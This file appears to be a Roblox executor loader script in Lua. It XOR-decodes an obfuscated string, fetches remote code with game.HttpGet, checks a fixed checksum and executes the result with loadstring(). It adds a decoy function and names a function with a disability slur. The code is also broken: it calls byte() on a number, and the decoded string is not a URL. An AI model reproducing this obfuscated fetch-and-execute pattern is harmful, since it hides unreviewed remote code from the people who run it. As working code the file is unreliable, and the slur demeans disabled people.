local repo = "https://raw.githubusercontent.com/BloxMan00/LinoriaLib/refs/heads/main/"
local function xor(str, key)
    local out = {}
    for i = 1, #str do
        out[i] = string.char(bit32.bxor(str:byte(i), key:byte((i-1) % #key + 1):byte()))
    end
    return table.concat(out)
end
local function checksum(str)
    local sum = 0
    for i = 1, #str do
        sum = (sum + str:byte(i)) % 65536
    end
    return sum
end
local function pleaseleave()
    local t, s = {}, 0
    for i = 1, 10 do t[i] = i*i; s=s+t[i] end
    if s==99999 then error("Impossible!") end
end
local encodedURL = "\21\35\27\1\4\19\12"
local key = "k"
local url = xor(encodedURL, key)
local function Autism(u)
    local ok, raw = pcall(game.HttpGet or game.HttpGetAsync, game, u)
    if not ok then error("Failed to load script!") end
    if checksum(raw) ~= 12345 then
        error("Script checksum mismatch! Possible tampering detected.")
    end
    return raw
end
local durrrrr = Autism(url)
pleaseleave()
loadstring(durrrrr)()
